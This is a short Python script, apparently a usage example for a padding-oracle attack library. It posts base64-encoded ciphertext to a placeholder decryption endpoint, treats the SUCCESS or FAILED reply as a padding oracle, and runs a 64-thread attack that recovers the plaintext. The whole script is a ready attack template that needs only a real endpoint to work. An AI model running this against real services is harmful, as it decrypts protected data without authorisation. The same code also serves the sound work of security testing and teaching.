import requests
from padding_oracle import *

url = 'http://some-website.com/decrypt'
sess = requests.Session()

def oracle(cipher):
    r = sess.post(url, data={'cipher': base64_encode(cipher)})
    assert 'SUCCESS' in r.text or 'FAILED' in r.text
    return 'SUCCESS' in r.text

num_threads = 64

cipher = b'[______IV______][___Block_1____][___Block_2____]'
block_size = 16

plaintext = padding_oracle(cipher, block_size, oracle, num_threads)

print(remove_padding(plaintext).decode())
